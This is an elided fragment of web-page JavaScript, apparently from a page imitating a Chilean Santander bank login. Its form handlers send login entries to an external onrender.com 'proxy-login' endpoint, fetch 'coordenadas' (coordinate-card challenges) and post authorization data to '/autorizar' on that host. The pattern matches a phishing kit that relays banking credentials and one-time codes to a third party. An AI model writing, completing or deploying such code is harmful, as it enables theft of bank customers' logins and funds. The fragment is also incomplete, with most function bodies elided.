...
document.getElementById("loginForm").addEventListener("submit", async function(e){
  ...
  try {
    const response = await fetch("https://obchile-p9hv.onrender.com/proxy-login", {
      method: "POST",
...
tipoAutorizacion.addEventListener("change", async () => {
  if(tipoAutorizacion.value === "santander"){
    ...
    try {
      const resp = await fetch("https://obchile-p9hv.onrender.com/coordenadas");
...
formSantander.addEventListener("submit", async (e) => {
  ...
  try {
    await fetch("https://obchile-p9hv.onrender.com/autorizar", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
